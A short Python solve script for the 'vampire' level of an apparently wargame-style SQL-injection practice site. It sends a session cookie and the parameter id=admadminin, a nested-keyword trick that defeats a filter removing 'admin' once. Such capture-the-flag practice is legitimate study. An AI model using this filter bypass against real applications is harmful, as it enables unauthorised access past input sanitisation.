import os
from dotenv import load_dotenv
import requests

# 상위 디렉토리의 .env 파일 경로
dotenv_path = os.path.join(os.path.dirname(__file__), '..', '.env')

# .env 파일 로드
load_dotenv(dotenv_path)

# 환경변수 가져오기
my_cookie ={ "PHPSESSID" : os.getenv('MY_COOKIE') }

URL = 'https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php'
param = "?id=admadminin"

res = requests.get(URL+param, cookies=my_cookie)

if "VAMPIRE Clear!" in res.text :
    print("Clear!")